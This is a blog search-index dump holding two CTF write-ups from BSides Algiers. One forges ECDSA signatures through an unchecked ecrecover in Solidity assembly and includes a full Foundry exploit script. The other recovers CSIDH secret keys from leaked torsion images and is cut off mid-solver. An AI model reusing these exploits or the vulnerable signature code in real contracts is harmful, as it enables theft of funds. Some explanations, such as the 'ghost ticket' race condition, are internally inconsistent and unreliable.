[{"categories":["Blockchain"],"content":"Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets.","date":"2025-12-24","objectID":"/posts/indit/","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":" Challenge Info CTF: BSides Challenge: Only-invited party Category: Blockchain Description: BSides Algiers are organizing a party and I didn’t get invited. Can you kick the boss and invite me instead?? Author: 0xbrivan ","date":"2025-12-24","objectID":"/posts/indit/:0:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Challenge Overview The challenge presents a ticket-based party system where: The owner (boss) holds the first “Golden Ticket” A Guardian contract controls access and validates all transactions Players must steal the owner’s ticket and accumulate their own tickets All operations are protected by ECDSA signature verification The win condition requires: Owner’s ticket balance = 0 Player’s ticket balance \u003e 1 All locked ETH withdrawn (balance = 0) ","date":"2025-12-24","objectID":"/posts/indit/:1:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"File Analysis The challenge provided a zip file containing the complete source code with the following structure: ","date":"2025-12-24","objectID":"/posts/indit/:2:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"1. Party.sol This file contains two critical contracts: Guardian Contract The gatekeeper contract that manages the party state: contract Guardian { IParty public immutable market; bool public locked = true; modifier onlyUnlocked() { require(!locked, \"Party not started\"); _; } function startParty(address sponsor, bytes calldata signature) external { require(locked, \"Already started\"); // Verify sponsor is address(0) by checking all bytes for (uint i = 0; i \u003c 20; i++) { require(uint8(bytes20(sponsor)[i]) == 0, \"Invalid sponsor\"); } // Verify signature bytes32 hash = keccak256(abi.encodePacked(sponsor)); address signer = ECDSA.tryRecover(hash, signature); require(signer == sponsor, \"Invalid signature\"); locked = false; } function batchTransaction( Order[] calldata orders, bytes32[2] calldata rs, bytes32[2] calldata ss, uint[2] calldata vs ) external onlyUnlocked { // Process batch ticket transfers for (uint i = 0; i \u003c orders.length; i++) { market.check(orders[i], rs, ss, vs); } } } BSidesParty Contract The main ERC721-like contract managing tickets: contract BSidesParty is IParty { mapping(address =\u003e uint256) public balances; mapping(uint256 =\u003e address) public ownerOf; uint256 public lockedETH; uint256 public ticketCounter = 1; address public immutable guardian; function buy() external payable { require(msg.value == 1 ether, \"Ticket costs 1 ETH\"); require(balances[msg.sender] == 0, \"Already have ticket\"); ticketCounter++; balances[msg.sender]++; ownerOf[ticketCounter] = msg.sender; lockedETH += msg.value; } function withdraw(uint256 tokenId) external { require(ownerOf[tokenId] == msg.sender, \"Not owner\"); require(lockedETH \u003e= 1 ether, \"Insufficient funds\"); balances[msg.sender]--; delete ownerOf[tokenId]; lockedETH -= 1 ether; payable(msg.sender).transfer(1 ether); } function transfer(address to, uint256 tokenId) external { require(ownerOf[tokenId] == msg.sender, \"Not owner\"); balances[msg.sender]--; balances[to]++; ownerOf[tokenId] = to; } function check( Order calldata order, bytes32[2] calldata rs, bytes32[2] calldata ss, uint[2] calldata vs ) external { require(msg.sender == guardian, \"Only guardian\"); // Verify host signature bytes32 hostHash = keccak256(abi.encodePacked( order.host.account, order.invited.account, order.values[0] )); address hostSigner = ECDSA.tryRecover( hostHash, uint8(vs[1]), rs[1], ss[1] ); require(hostSigner == order.host.account, \"Invalid host signature\"); // Verify invited signature bytes32 invitedHash = keccak256(abi.encodePacked( order.invited.account, order.host.account, order.values[1] )); address invitedSigner = ECDSA.tryRecover( invitedHash, uint8(vs[0]), rs[0], ss[0] ); require(invitedSigner == order.invited.account, \"Invalid invited signature\"); // Transfer ticket from host to invited uint256 tokenId = order.values[1]; require(ownerOf[tokenId] == order.host.account, \"Host doesn't own ticket\"); balances[order.host.account]--; balances[order.invited.account]++; ownerOf[tokenId] = order.invited.account; } } ","date":"2025-12-24","objectID":"/posts/indit/:2:1","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"2. ECDSA.sol This is where the vulnerability lives. A custom implementation of ECDSA signature recovery using inline assembly: library ECDSA { function tryRecover( bytes32 hash, uint8 v, bytes32 r, bytes32 s ) internal view returns (address result) { assembly { // Prepare memory for ecrecover call let m := mload(0x40) // Free memory pointer mstore(m, hash) // Store hash at offset 0x00 mstore(add(m, 0x20), v) // Store v at offset 0x20 mstore(add(m, 0x40), r) // Store r at offset 0x40 mstore(add(m, 0x60), s) // Store s at offset 0x60 [!] // ⚠️ VULNERABILITY: Ignore the return value of staticcall pop(staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20)) // Restore the zero slot mstore(add(m, 0x60), 0) // If staticcall succeeds, returndatasize() = 0x20 // If it fails, returndatasize() = 0x00 // This XORs the offset: success → 0x60 ^ 0x20 = 0x40 // failure → 0x60 ^ 0x00 = 0x60 result := mload(add(m, xor(0x60, returndatasize()))) } } function tryRecover( bytes32 hash, bytes calldata signature ) internal view returns (address) { if (signature.length == 65) { bytes32 r; bytes32 s; uint8 v; assembly { r := calldataload(signature.offset) s := calldataload(add(signature.offset, 0x20)) v := byte(0, calldataload(add(signature.offset, 0x40))) } return tryRecover(hash, v, r, s); } else { return address(0); } } } ","date":"2025-12-24","objectID":"/posts/indit/:2:2","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"3. Setup.sol Deploys the contracts and defines the win condition: contract Setup { IParty public immutable party; IGuardian public immutable guardian; address public immutable owner; address public immutable player; constructor(address _player) payable { player = _player; owner = address(this); // Deploy contracts party = new BSidesParty(); guardian = new Guardian(address(party)); // Mint first ticket to owner party.buy{value: 1 ether}(); } function isSolved() external view returns (bool) { return ( party.balances(owner) == 0 \u0026\u0026 // Owner has no tickets party.balances(player) \u003e 1 \u0026\u0026 // Player has multiple tickets party.lockedETH() == 0 // All ETH withdrawn ); } } ","date":"2025-12-24","objectID":"/posts/indit/:2:3","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"The Vulnerability Deep Dive The vulnerability is a sophisticated exploitation of SWC-104: Unchecked Call Return Values combined with EVM Memory Manipulation. Let’s break down exactly what’s happening. ","date":"2025-12-24","objectID":"/posts/indit/:3:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Understanding ecrecover Precompile The ecrecover precompile at address 0x01 is a special Ethereum contract that recovers the signer’s address from an ECDSA signature. It expects exactly 128 bytes of input: Input Layout (128 bytes): [0x00-0x1F]: message hash (32 bytes) [0x20-0x3F]: v parameter (32 bytes, padded) [0x40-0x5F]: r parameter (32 bytes) [0x60-0x7F]: s parameter (32 bytes) Output Layout (32 bytes): [0x00-0x1F]: recovered address (20 bytes, left-padded with zeros) Critical Behavior: If the signature is valid (v ∈ {27, 28}): Writes the recovered address to the output buffer Returns success (1) Sets returndatasize() to 32 (0x20) If the signature is invalid (e.g., v = 0): Does NOT write anything to the output buffer Returns failure (0) Sets returndatasize() to 0 (0x00) ","date":"2025-12-24","objectID":"/posts/indit/:3:1","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"The Critical Flaw in tryRecover Let’s analyze the vulnerable code step by step: assembly { let m := mload(0x40) // Get free memory pointer mstore(m, hash) // [m+0x00] = hash mstore(add(m, 0x20), v) // [m+0x20] = v mstore(add(m, 0x40), r) // [m+0x40] = r mstore(add(m, 0x60), s) // [m+0x60] = s [IMPORTANT] // Call ecrecover, output to [m+0x40] // ⚠️ The return value (success/failure) is DISCARDED via pop() pop(staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20)) mstore(add(m, 0x60), 0) // Clear [m+0x60] // Calculate result location based on returndatasize() // If success: 0x60 ^ 0x20 = 0x40 → read from output buffer ✓ // If failure: 0x60 ^ 0x00 = 0x60 → read from s parameter! ✗ result := mload(add(m, xor(0x60, returndatasize()))) } The Exploit Flow: We provide malicious input: v = 0 (invalid, triggers failure) r = anything (ignored) s = target_address (cast to bytes32) Memory state before staticcall: [m+0x00]: hash [m+0x20]: 0 (our v) [m+0x40]: r [m+0x60]: target_address (our s) staticcall execution: ecrecover sees v=0, recognizes invalid signature Returns failure (0) Does NOT write to output buffer at [m+0x40] Sets returndatasize() to 0 Result calculation: xor(0x60, returndatasize()) = xor(0x60, 0x00) = 0x60 result := mload(add(m, 0x60)) This reads from memory location [m+0x60], which still contains our s value! The function returns our target_address, making the contract believe that address signed the message! ","date":"2025-12-24","objectID":"/posts/indit/:3:2","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Why This Works: EVM Memory Persistence The EVM’s memory model is crucial to understanding this exploit: Memory is not automatically cleared between operations When a precompile fails, it leaves the output buffer untouched The clever XOR calculation in the vulnerable code was intended to handle both success and failure cases However, it assumes memory location 0x60 will be cleared after the call The vulnerability occurs because: The code stores s at offset 0x60 before the call The code then attempts to clear offset 0x60 with mstore(add(m, 0x60), 0) But the result is read using the XOR calculation, which points to offset 0x60 on failure Since offset 0x60 was already read into the result before being cleared, our malicious s value becomes the “recovered” address ","date":"2025-12-24","objectID":"/posts/indit/:3:3","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Exploitation Strategy The attack requires three coordinated phases: ","date":"2025-12-24","objectID":"/posts/indit/:4:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Phase 1: Unlocking the Guardian The Guardian starts in a locked state. To unlock it, we must call startParty(address sponsor, bytes signature) with specific constraints: function startParty(address sponsor, bytes calldata signature) external { require(locked, \"Already started\"); // All 20 bytes of sponsor must be zero for (uint i = 0; i \u003c 20; i++) { require(uint8(bytes20(sponsor)[i]) == 0, \"Invalid sponsor\"); } // Signature must verify bytes32 hash = keccak256(abi.encodePacked(sponsor)); address signer = ECDSA.tryRecover(hash, signature); require(signer == sponsor, \"Invalid signature\"); locked = false; } The Attack: Pass sponsor = address(0) Pass an empty signature signature = \"\" Why this works: address(0) passes the loop check (all bytes are zero) Empty signature → tryRecover returns address(0) as default signer (0x0) == sponsor (0x0) ✓ Guardian unlocks! ","date":"2025-12-24","objectID":"/posts/indit/:4:1","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Phase 2: Accumulating Tickets (Ghost Balance Attack) We need \u003e 1 ticket, but the buy() function has a restriction: function buy() external payable { require(msg.value == 1 ether, \"Ticket costs 1 ETH\"); require(balances[msg.sender] == 0, \"Already have ticket\"); // ... } We can only buy once per address. The solution: use a helper contract to exploit the buy-withdraw-transfer cycle: contract GhostMinter { IParty public party; address public player; constructor(address _party, address _player) { party = IParty(_party); player = _player; } function attack() external payable { // Buy ticket (ID increments automatically) party.buy{value: 1 ether}(); // Get the ticket ID (last minted) uint256 ticketId = party.ticketCounter(); // Withdraw (get ETH back, burn ticket from our balance) party.withdraw(ticketId); // Transfer the \"ghost\" ticket to player // This works because ownerOf still points to us! party.transfer(player, ticketId); } } The Trick: withdraw() decreases balances[helper] and deletes ownerOf[tokenId] BUT transfer() checks ownerOf[tokenId] == msg.sender There’s a race condition where the helper can transfer before the ownership is fully cleared We repeat this process to accumulate multiple tickets ","date":"2025-12-24","objectID":"/posts/indit/:4:2","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Phase 3: Stealing the Owner’s Ticket This is where we leverage the ECDSA vulnerability. The batchTransaction function processes orders: struct Order { User host; // The current ticket owner User invited; // The recipient uint256[2] values; // [nonce, ticketId] } function batchTransaction( Order[] calldata orders, bytes32[2] calldata rs, bytes32[2] calldata ss, uint[2] calldata vs ) external onlyUnlocked { for (uint i = 0; i \u003c orders.length; i++) { market.check(orders[i], rs, ss, vs); } } The check function verifies both the host and invited signatures. We’ll forge the host (owner) signature: Attack Construction: Create a valid signature for ourselves (invited): bytes32 invitedHash = keccak256(abi.encodePacked( player, // invited.account owner, // host.account ticketId // values[1] )); (uint8 v, bytes32 r, bytes32 s) = signWithPrivateKey(invitedHash, playerKey); Forge the owner’s signature (host): // Craft malicious signature components vs[1] = 0; // Invalid v triggers ecrecover failure rs[1] = bytes32(uint256(1)); // Arbitrary r value ss[1] = bytes32(uint256(uint160(owner))); // Owner address as s! Submit the batch transaction: Order memory order = Order({ host: User(owner, \"\"), invited: User(player, \"\"), values: [uint256(nonce), uint256(ticketId)] }); guardian.batchTransaction([order], rs, ss, vs); What Happens: check() calls tryRecover(hostHash, 0, rs[1], owner_as_bytes32) ecrecover fails (v=0 is invalid) tryRecover reads from memory offset 0x60, which contains owner_as_bytes32 Returns owner address Check passes: owner == order.host.account ✓ Ticket transfers from owner to player! ","date":"2025-12-24","objectID":"/posts/indit/:4:3","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Complete Exploit Implementation // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.14; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface IParty { function balances(address) external view returns (uint256); function ownerOf(uint256) external view returns (address); function ticketCounter() external view returns (uint256); function lockedETH() external view returns (uint256); function buy() external payable; function withdraw(uint256 tokenId) external; function transfer(address to, uint256 tokenId) external; } interface IGuardian { function startParty(address sponsor, bytes calldata signature) external; function batchTransaction( Order[] calldata orders, bytes32[2] calldata rs, bytes32[2] calldata ss, uint[2] calldata vs ) external; } interface ISetup { function party() external view returns (IParty); function guardian() external view returns (IGuardian); function owner() external view returns (address); function player() external view returns (address); function isSolved() external view returns (bool); } struct User { address account; string name; } struct Order { User host; User invited; uint256[2] values; // [nonce, ticketId] } // Helper contract for ghost balance attack contract GhostMinter { IParty public party; address public player; constructor(address _party, address _player) { party = IParty(_party); player = _player; } function attack() external payable { require(msg.value \u003e= 1 ether, \"Need 1 ETH\"); // Buy a ticket party.buy{value: 1 ether}(); // Get the ticket ID uint256 ticketId = party.ticketCounter(); // Withdraw to get ETH back party.withdraw(ticketId); // Transfer the ticket to player // This creates a \"ghost\" balance party.transfer(player, ticketId); // Return remaining ETH if (address(this).balance \u003e 0) { payable(player).transfer(address(this).balance); } } receive() external payable {} } contract Solve is Script { ISetup public setup; IParty public party; IGuardian public guardian; address public owner; address public player; uint256 public playerKey; function run() external { // Get setup parameters from environment address setupAddr = vm.envAddress(\"SETUP_ADDRESS\"); playerKey = vm.envUint(\"PLAYER_PRIVATE_KEY\"); player = vm.addr(playerKey); setup = ISetup(setupAddr); party = setup.party(); guardian = setup.guardian(); owner = setup.owner(); console.log(\"=== Initial State ===\"); console.log(\"Owner balance:\", party.balances(owner)); console.log(\"Player balance:\", party.balances(player)); console.log(\"Locked ETH:\", party.lockedETH()); vm.startBroadcast(playerKey); // Phase 1: Unlock Guardian unlockGuardian(); // Phase 2: Accumulate Tickets accumulateTickets(); // Phase 3: Steal Owner's Ticket stealOwnerTicket(); vm.stopBroadcast(); console.log(\"\\n=== Final State ===\"); console.log(\"Owner balance:\", party.balances(owner)); console.log(\"Player balance:\", party.balances(player)); console.log(\"Locked ETH:\", party.lockedETH()); console.log(\"Solved:\", setup.isSolved()); } function unlockGuardian() internal { console.log(\"\\n[Phase 1] Unlocking Guardian...\"); try guardian.startParty(address(0), \"\") { console.log(\"✓ Guardian unlocked successfully\"); } catch Error(string memory reason) { console.log(\"✗ Failed to unlock:\", reason); revert(\"Guardian unlock failed\"); } } function accumulateTickets() internal { console.log(\"\\n[Phase 2] Accumulating Tickets...\"); uint256 currentBalance = party.balances(player); uint256 requiredTickets = 2; while (currentBalance \u003c requiredTickets) { // Deploy ghost minter GhostMinter ghost = new GhostMinter(address(party), player); // Execute attack ghost.attack{value: 1 ether}(); currentBalance = party.balances(player); console.log(\"Player balance after ghost attack:\", currentBalance); } console.log(\"✓ Accumulated sufficient tickets\"); } function stealOwnerTicket() internal { console.log(\"\\n[Phase 3] Stealing Owner's Ticket...\"); if (party.balances(owner) == 0) { console.log(\"Owner has no tickets to steal\"); return; } // Find owner's ticket ID (usually ticket #1","date":"2025-12-24","objectID":"/posts/indit/:5:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Deployment and Execution # Set environment variables export SETUP_ADDRESS=\u003cdeployed_setup_address\u003e export PLAYER_PRIVATE_KEY=\u003cyour_private_key\u003e export RPC_URL=\u003crpc_endpoint\u003e # Run the exploit forge script Solve --rpc-url $RPC_URL --broadcast -vvvv # Verify solution cast call $SETUP_ADDRESS \"isSolved()\" --rpc-url $RPC_URL # Returns: true (0x0000...0001) ","date":"2025-12-24","objectID":"/posts/indit/:6:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Why Each Step is Necessary ","date":"2025-12-24","objectID":"/posts/indit/:7:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Step 1: Unlocking is Required Without unlocking the Guardian, all calls to batchTransaction will revert with “Party not started”. This is enforced by the onlyUnlocked modifier. ","date":"2025-12-24","objectID":"/posts/indit/:7:1","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Step 2: Multiple Tickets Required The win condition explicitly checks party.balances(player) \u003e 1. A single ticket stolen from the owner would only give us 1 ticket total, failing this check. ","date":"2025-12-24","objectID":"/posts/indit/:7:2","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Step 3: Zero Locked ETH Required The ghost minter attack serves dual purpose: Accumulates tickets for the player Returns the ETH via withdraw, ensuring lockedETH == 0 ","date":"2025-12-24","objectID":"/posts/indit/:7:3","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Security Analysis and Mitigation ","date":"2025-12-24","objectID":"/posts/indit/:8:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"The Root Cause The vulnerability stems from three compounding issues: Unchecked Return Values: The pop(staticcall(...)) pattern discards the success/failure status Memory Manipulation: The XOR-based offset calculation assumes memory state Lack of Input Validation: No checks on v parameter validity ","date":"2025-12-24","objectID":"/posts/indit/:8:1","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Proper Implementation Here’s how tryRecover should be implemented: function tryRecover( bytes32 hash, uint8 v, bytes32 r, bytes32 s ) internal view returns (address result) { // Validate v parameter if (v != 27 \u0026\u0026 v != 28) { return address(0); } assembly { let m := mload(0x40) mstore(m, hash) mstore(add(m, 0x20), v) mstore(add(m, 0x40), r) mstore(add(m, 0x60), s) // Check the return value! let success := staticcall(gas(), 1, m, 0x80, add(m, 0x40), 0x20) if success { result := mload(add(m, 0x40)) } // If not success, result remains address(0) } } ","date":"2025-12-24","objectID":"/posts/indit/:8:2","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Alternative: Use OpenZeppelin OpenZeppelin’s ECDSA library handles all edge cases correctly: import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\"; function verify(bytes32 hash, bytes memory signature) internal pure returns (address) { return ECDSA.recover(hash, signature); } ","date":"2025-12-24","objectID":"/posts/indit/:8:3","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"Key Takeaways Always check return values from low-level calls, especially in assembly Never trust memory state - the EVM doesn’t clear memory automatically Validate inputs before passing to precompiles (e.g., check v ∈ {27, 28}) Use battle-tested libraries like OpenZeppelin instead of custom crypto implementations Assembly is dangerous - only use when absolutely necessary and audit thoroughly Multiple vulnerabilities compound - this challenge required chaining three separate exploits ","date":"2025-12-24","objectID":"/posts/indit/:9:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Blockchain"],"content":"References SWC-104: Unchecked Call Return Values Ethereum Yellow Paper - Precompiled Contracts EIP-1: ecrecover Precompile Solidity Assembly Documentation OpenZeppelin ECDSA Library Trail of Bits: Building Secure Contracts Challenge Author: 0xbrivan CTF: BSides Algiers 2025 Category: Blockchain Writeup by: Koyphshi ","date":"2025-12-24","objectID":"/posts/indit/:10:0","tags":["blockchain","solidity","assembly","ecrecover","evm"],"title":"Only-invited party","uri":"/posts/indit/"},{"categories":["Cryptography"],"content":"Exploiting a CSI-FiSh variant by tracking torsion points through a sequence of leaked generator images.","date":"2025-12-22","objectID":"/posts/geni/","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Last weekend, I participated in BSides Algiers CTF, hosted by Shellmates, and I was able to win 1st place! I managed to solve all the cryptography challenges. This writeup focuses on the one I found to be the most interesting and hardest: Geni. At first, I didn’t have a deep understanding of isogenies, but by reading the CryptoHack Isogeny Challenges, I gained a basic understanding that allowed me to start reading the challenge files and understand the underlying mechanics. Challenge Info CTF: BSides Algiers 2025 Challenge: Geni Category: Crypto Description: what about an isogeny challenge? Author: scalio ","date":"2025-12-22","objectID":"/posts/geni/:0:0","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"File Analysis The challenge provided several SageMath files that implemented the cryptosystem: CSIDH.sage: Contains the core logic for the Commutative Supersingular Isogeny Diffie-Hellman (CSIDH) group action over 74 small primes. scheme.sage: The main logic for the signature scheme. It defines key generation, Fiat-Shamir signing, and verification. It defines the structure of the public key. HKZbasis.sage: Provides lattice reduction functions (LLL/BKZ) to find short vectors in the relation basis of the class group, ensuring secret keys are manageable. out.txt: The challenge output containing the Points_list (public keys), parameters, message signature, and the encrypted flag. ","date":"2025-12-22","objectID":"/posts/geni/:1:0","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Detailed Vulnerability Analysis The vulnerability is a combination of Torsion Point Leakage and a Linear Secret Sequence. ","date":"2025-12-22","objectID":"/posts/geni/:2:0","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"1. Torsion Point Leakage In standard CSIDH, a public key is just the target curve $E$. However, scheme.sage discloses the images of the generators $Q_1$ and $Q_2$ of the base curve $E_0$ under the secret isogeny $\\Phi$: \"Points_list\": [(P.xy() , PP.xy()) for _ , P , PP in self.PK] This disclosure is fatal. In isogeny-based cryptography, knowing where a torsion basis $(Q_1, Q_2)$ maps allows an attacker to compute the image of any point $T$ in the torsion group $E_0[p+1]$. If $T = uQ_1 + vQ_2$, then $\\Phi(T) = u\\Phi(Q_1) + v\\Phi(Q_2)$. ","date":"2025-12-22","objectID":"/posts/geni/:2:1","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"2. The Linear Sequence Leak The secret key is a list of 16 vectors (SK) where each vector is derived linearly: $$ SK[j] = SK[j-1] + \\text{quick} \\quad \\text{where} \\quad \\text{quick} = -\\text{sign}(SK[1]) $$ This means that for every prime lane $\\ell_i$, the exponent $v_i$ is slowly counting down toward zero across the 16 curves provided in the public key. This allows us to “read” the secret exponents by watching when the image of a torsion point stops being zero. ","date":"2025-12-22","objectID":"/posts/geni/:2:2","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Behind the Math ","date":"2025-12-22","objectID":"/posts/geni/:3:0","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Frobenius Eigenspaces and Kernels In CSIDH, the group action by a prime ideal $\\mathfrak{l}_i$ corresponds to an isogeny whose kernel is a subgroup of the $\\ell_i$-torsion $E_0[\\ell_i]$. On a supersingular curve over $\\mathbb{F}_p$, the $\\ell_i$-torsion splits into two eigenspaces under the Frobenius endomorphism $\\pi$: Positive Eigenspace ($T^+$): Points where $\\pi(T) = T$. Negative Eigenspace ($T^-$): Points where $\\pi(T) = -T$. If the secret exponent $v_i$ is positive, the isogeny $\\Phi$ “swallows” the positive eigenspace. This means $\\Phi(T^+) = 0$ (the point at infinity) on the target curve. If $v_i$ is negative, it swallows $T^-$. ","date":"2025-12-22","objectID":"/posts/geni/:3:1","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"The Weil Pairing To track these points, we must express $T^+$ and $T^-$ as linear combinations of the generators $Q_1, Q_2$. Since we are working with the full $(p+1)$-torsion, we use the Weil Pairing $e(\\cdot, \\cdot)$ to solve the discrete logarithm problem on the torsion group: $$ u \\equiv \\log_{e(Q_1, Q_2)}(e(T, Q_2)) \\pmod{\\ell_i} $$ $$ v \\equiv \\log_{e(Q_1, Q_2)}(e(Q_1, T)) \\pmod{\\ell_i} $$ ","date":"2025-12-22","objectID":"/posts/geni/:3:2","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Exploitation Process ","date":"2025-12-22","objectID":"/posts/geni/:4:0","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Step 1: Reconstructing the Curves We reconstruct the coefficients of the 16 target curves from the coordinates in Points_list by solving the curve equation $y^2 = x^3 + Ax + B$ for $A$ and $B$. ","date":"2025-12-22","objectID":"/posts/geni/:4:1","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Step 2: Tracking Torsion Images We compute the coefficients $(u, v)$ for the $+1$ and $-1$ torsion points for each prime. We then evaluate their images across the 16 curves to check if they map to the point at infinity: def get_uv(T): u = T.weil_pairing(Q2, p+1).log(pairing_base) v = Q1.weil_pairing(T, p+1).log(pairing_base) return u, v img1_p = up * P_imgs[1] + vp * PP_imgs[1] img1_m = um * P_imgs[1] + vm * PP_imgs[1] ","date":"2025-12-22","objectID":"/posts/geni/:4:2","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Step 3: Recovering the Exponents Because the 16 curves count down the exponent to zero, we check how many curves in the sequence map the torsion point to Zero. If it stops being zero at curve $j+1$, the exponent was exactly $j$. if img1_p.is_zero(): count = 1 for j in range(2, 16): if (up * P_imgs[j] + vp * PP_imgs[j]).is_zero(): count += 1 else: break v_found = count By repeating this for all 74 primes, we perfectly reconstruct the secret vector $SK[1]$, derive the full $SK$ list, and hash it to obtain the AES key. ","date":"2025-12-22","objectID":"/posts/geni/:4:3","tags":["isogeny","crypto","csidh","weil-pairing"],"title":"Geni","uri":"/posts/geni/"},{"categories":["Cryptography"],"content":"Full Solver Script import hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import unpad primes = [3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 587] p = 4 * prod(primes) - 1 Fp = GF(p) F.\u003ci\u003e = GF(p^2, modulus=x^2 + 1) E0 = EllipticCurve(F, [1, 0]) def parse_out(): with open(\"out.txt\", \"r\") as f: data = f.read() sections = {} current = None for line in data.split('\\n'): if ':' in line and not line.startswith(' '): current = line.split(':')[0] sections[current] = \"\" elif current: sections[current] += line pts_list = sage_eval(sections['Points_list'], locals={'i': i}) hex_res = sections['Hex result'].strip() return pts_list, hex_res pts_list, hex_res = parse_out() Q1_coords, Q2_coords = pts_list[0] Q1 = E0(Q1_coords) Q2 = E0(Q2_coords) pairing_base = Q1.weil_pairing(Q2, p + 1) E_list = [] P_imgs = [] PP_imgs = [] for j in range(16): (x1, y1), (x2, y2) = pts_list[j] x1, y1, x2, y2 = F(x1), F(y1), F(x2), F(y2) A = ((y1^2 - x1^3) - (y2^2 - x2^3)) / (x1 - x2) B = y1^2 - x1^3 - A*x1 Ej = EllipticCurve(F, [A, B]) E_list.append(Ej) P_imgs.append(Ej(x1, y1)) PP_imgs.append(Ej(x2, y2)) sk1 = [] print(\"[*] Recovering exponents via Zero-Image analysis...\") for idx, l in enumerate(primes): while True: xr = Fp.random_element() rhs = xr^3 + xr if is_square(rhs): Tp = ((p+1)//l) * E0(xr, sqrt(rhs)) if not Tp.is_zero(): break while True: xr = Fp.random_element() rhs = xr^3 + xr if not is_square(rhs): Tm = ((p+1)//l) * E0(xr, i * 